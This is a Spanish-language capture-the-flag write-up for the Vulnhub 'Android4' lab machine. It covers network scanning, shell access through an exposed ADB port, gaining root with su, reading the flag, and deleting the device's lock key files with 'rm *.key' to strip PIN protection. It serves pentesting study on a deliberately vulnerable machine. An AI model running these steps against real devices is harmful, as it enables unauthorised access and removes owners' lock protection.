<p align="center">
  <a href="https://github.com/DenverCoder1/readme-typing-svg"><img src="https://readme-typing-svg.herokuapp.com?size=50&color=F7F400&width=300&height=80&lines=ANDROID_4"></a>
</p>

<h1 align="center"></h1>

**[Descargar máquina]:**

Vulnhub: https://www.vulnhub.com/entry/android4-1,233/

<h1 align="center"><img src="https://user-images.githubusercontent.com/75953873/179633430-0029a8f7-b789-49a2-80be-12f04ed9357f.png"></h1>

</br>

- *Paso 1:* Identificar la IP de la máquina host con ArpScan. 
```
arp-scan --interface eth0 -l
```
![2](https://user-images.githubusercontent.com/75953873/179633673-54c343f6-fe1c-49bd-a070-a2ccdb4cf488.png)

IP host: `192.168.25.139`

- *Paso 2:* Escanear todos los puertos que estén abiertos con Nmap. 
```
nmap -p- --open -sC -n -vvv 192.168.25.139
```
![3](https://user-images.githubusercontent.com/75953873/179633819-76e89cc3-3e47-4f1c-9d4c-bcd153f748b9.png)

Puertos abiertos: [8080,22000,5555]

- *Paso 3:* Detección de servicios y sistema operativo. 
```
nmap -p 8080,22000,5555 -A 192.168.25.139
```
![4](https://user-images.githubusercontent.com/75953873/179634411-2134bb33-54f8-45c7-a0be-b6dbb9824153.png)

Servidor web (puerto **8080**): `http://192.168.25.139:8080`

![5](https://user-images.githubusercontent.com/75953873/179634788-bc82e682-c166-43c9-bd67-366001b12fd5.png)

O.S: `Android` **--> Kernel Linux**

Puerto **5555**: Es un puerto utilizado por ADB (Puente de Depuración de Android) que se utiliza para conectarse a teléfonos móviles a través de TCP y ejecutar comandos.

- *Paso 4:* Conectarse al dispositivo vía ADB y capturar la flag.

Descargar ADB:
```
apt-get install -y adb
```

Crear conexión con el dispositivo y obtener una shell:
```
adb connect 192.168.25.139:5555
adb shell
```
![6](https://user-images.githubusercontent.com/75953873/179636318-eb4f31c6-3c25-4881-aec8-802eb3052785.png)

Acceder a superusuario (**root**) y capturar la flag del directorio `/data/root`:
```
su
cd /data/root
cat flag.txt
```
![7](https://user-images.githubusercontent.com/75953873/179636561-0b059ea4-2dd0-4c97-bc47-0ea74cfd023b.png)

**FLAG:** ANDROID{u_GOT_root_buddy}


Eliminar los archivos claves del directorio del sistema para desactivar la protección (PIN):
```
su
cd /data/system
rm *.key
```
![8](https://user-images.githubusercontent.com/75953873/179638008-1d1c29c4-ef57-46e4-acae-ab7e68e1b560.png)


<h1 align="center"><img src="https://user-images.githubusercontent.com/75953873/179639178-5a6c14a9-a48e-4e01-ad24-6416878c6429.png"></h1>
